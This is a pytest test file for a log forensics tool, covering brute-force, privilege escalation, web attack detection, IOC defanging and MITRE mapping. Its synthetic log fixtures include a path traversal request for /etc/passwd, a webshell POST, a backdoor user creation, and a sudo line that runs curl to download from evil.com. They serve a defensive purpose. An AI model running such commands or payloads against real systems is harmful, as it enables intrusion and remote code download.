import pytest
from pathlib import Path
from fastapi.testclient import TestClient
from app.analyzers.logs.auth_log import AuthLogParser
from app.analyzers.logs.syslog import SyslogParser
from app.analyzers.logs.web_log import WebLogParser
from app.analyzers.logs.parser import LogForensicsEngine
from app.analyzers.ioc import IOCExtractor, defang_ioc
from app.analyzers.mitre import MitreMapper

def test_auth_log_brute_force_detection():
    """Tests that a burst of 6 failed SSH login attempts within 60s from an attacker IP triggers brute force detection."""
    sample_auth_lines = [
        "Nov 21 12:00:01 server sshd[1001]: Failed password for invalid user admin from 203.0.113.5 port 44321 ssh2",
        "Nov 21 12:00:05 server sshd[1002]: Failed password for root from 203.0.113.5 port 44322 ssh2",
        "Nov 21 12:00:10 server sshd[1003]: Failed password for invalid user test from 203.0.113.5 port 44323 ssh2",
        "Nov 21 12:00:15 server sshd[1004]: Failed password for user deploy from 203.0.113.5 port 44324 ssh2",
        "Nov 21 12:00:20 server sshd[1005]: Failed password for invalid user ubuntu from 203.0.113.5 port 44325 ssh2",
        "Nov 21 12:00:25 server sshd[1006]: Failed password for invalid user oracle from 203.0.113.5 port 44326 ssh2",
        "Nov 21 12:01:00 server sshd[1007]: Accepted password for deploy from 203.0.113.5 port 44327 ssh2",
    ]

    events = AuthLogParser.parse_lines(sample_auth_lines, target_year=2026, timezone_offset_hours=0.0)
    assert len(events) == 7

    # Check brute force burst tag
    bf_events = [e for e in events if e["normalized_type"] == "auth_brute_force"]
    assert len(bf_events) == 6
    assert all(e["relevance_score"] >= 90 for e in bf_events)
    assert "203.0.113.5" in bf_events[0]["message"]

    # Check successful login is recorded with high relevance
    succ_events = [e for e in events if e["normalized_type"] == "auth_success"]
    assert len(succ_events) == 1
    assert succ_events[0]["relevance_score"] == 70

def test_sudo_and_user_creation_detection():
    """Tests detection of privilege escalation and user additions."""
    sample_sudo_lines = [
        "Nov 21 12:02:00 server sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
        "Nov 21 12:03:00 server useradd[2001]: new user: name=backdoor_user, UID=1002, GID=1002, home=/home/backdoor_user",
    ]

    events = AuthLogParser.parse_lines(sample_sudo_lines, target_year=2026)
    assert len(events) == 2
    assert events[0]["normalized_type"] == "privilege_escalation"
    assert events[0]["relevance_score"] == 95  # elevated because /bin/bash was spawned as root
    assert events[1]["normalized_type"] == "account_created"

def test_web_log_path_traversal_and_attacks():
    """Tests detection of path traversal and web attack attempts."""
    sample_web_lines = [
        '198.51.100.20 - - [21/Nov/2026:12:05:00 +0000] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
        '198.51.100.20 - - [21/Nov/2026:12:05:05 +0000] "GET /../../etc/passwd HTTP/1.1" 403 280 "-" "curl/7.68.0"',
        '198.51.100.20 - - [21/Nov/2026:12:05:10 +0000] "POST /uploads/cmd.php HTTP/1.1" 200 450 "-" "python-requests/2.25.1"',
    ]

    events = WebLogParser.parse_lines(sample_web_lines)
    assert len(events) == 3

    # Normal request
    assert events[0]["normalized_type"] == "web_request"

    # Path traversal attack
    assert events[1]["normalized_type"] == "web_attack_attempt"
    assert "Path Traversal" in events[1]["message"]

    # Webshell access
    assert events[2]["normalized_type"] == "web_attack_attempt"
    assert "Webshell" in events[2]["message"]

def test_ioc_extraction_and_defanging():
    """Verifies that IOCs (IPv4, domains, URLs, paths) are correctly extracted and defanged."""
    log_text = "Connection from 198.51.100.99 to http://malicious-c2.xyz/drop.sh downloaded to /tmp/evil_payload.bin"
    iocs = IOCExtractor.extract_from_text(log_text)

    # Check defanging
    ip_ioc = next(i for i in iocs if i["type"] == "ipv4")
    assert ip_ioc["value"] == "198.51.100.99"
    assert ip_ioc["defanged"] == "198[.]51[.]100[.]99"

    url_ioc = next(i for i in iocs if i["type"] == "url")
    assert "hxxp://malicious-c2[.]xyz" in url_ioc["defanged"]

    path_ioc = next(i for i in iocs if i["type"] == "path")
    assert path_ioc["value"] == "/tmp/evil_payload.bin"

def test_mitre_mapping():
    """Verifies mapping of normalized forensic types to MITRE ATT&CK technique IDs."""
    techniques_bf = MitreMapper.map_event("auth_failed", "Failed password for root")
    assert any(t["id"] == "T1110.001" for t in techniques_bf)

    techniques_sudo = MitreMapper.map_event("privilege_escalation", "sudo: COMMAND=/bin/bash")
    assert any(t["id"] == "T1548.003" for t in techniques_sudo)
    assert any(t["id"] == "T1059.004" for t in techniques_sudo)

def test_full_log_analysis_engine_and_api(client: TestClient, tmp_path: Path):
    """End-to-end integration test: upload auth.log -> trigger log analyzer -> assert database storage."""
    # 1. Create a case
    c_res = client.post("/api/cases", json={"title": "Log Forensics Incident"})
    case_id = c_res.json()["id"]

    # 2. Upload synthetic auth.log
    sample_content = (
        "Nov 21 12:00:01 srv sshd[10]: Failed password for root from 192.0.2.1 port 5000\n"
        "Nov 21 12:00:02 srv sshd[11]: Failed password for root from 192.0.2.1 port 5001\n"
        "Nov 21 12:00:03 srv sshd[12]: Failed password for root from 192.0.2.1 port 5002\n"
        "Nov 21 12:00:04 srv sshd[13]: Failed password for root from 192.0.2.1 port 5003\n"
        "Nov 21 12:00:05 srv sshd[14]: Failed password for root from 192.0.2.1 port 5004\n"
        "Nov 21 12:00:06 srv sshd[15]: Failed password for root from 192.0.2.1 port 5005\n"
        "Nov 21 12:01:00 srv sudo: admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/curl -O http://evil.com/sh\n"
    )

    upload_res = client.post(
        f"/api/cases/{case_id}/upload",
        files=[("files", ("auth.log", sample_content.encode("utf-8"), "text/plain"))]
    )
    assert upload_res.status_code == 200
    file_id = upload_res.json()["uploaded_files"][0]["id"]

    # 3. Trigger analysis with explicit target year and timezone offset
    analyze_res = client.post(
        f"/api/cases/{case_id}/files/{file_id}/analyze?target_year=2026&timezone_offset_hours=5.5"
    )
    assert analyze_res.status_code == 200
    data = analyze_res.json()

    assert data["detected_format"] == "auth_log"
    assert data["total_lines_parsed"] == 7
    assert len(data["assumptions"]) >= 2
    assert any("2026" in a for a in data["assumptions"])
    assert any("5.5h" in a for a in data["assumptions"])

    # Verify MITRE techniques are extracted
    mitre_ids = [m["id"] for m in data["mitre_techniques"]]
    assert "T1110.001" in mitre_ids  # Brute Force
    assert "T1548.003" in mitre_ids  # Sudo
    assert "T1105" in mitre_ids      # Ingress Tool Transfer (curl)

    # Verify defanged IOCs are returned
    assert "192[.]0[.]2[.]1" in data["extracted_iocs"]["ipv4"]
    assert any("evil[.]com" in url for url in data["extracted_iocs"]["url"])

    # 4. Verify SQLite log_events table contains the parsed events
    from app.models.db_models import get_db
    with get_db() as db:
        cur = db.execute("SELECT COUNT(*) as count FROM log_events WHERE file_id = ?", (file_id,))
        count = cur.fetchone()["count"]
        assert count == 7
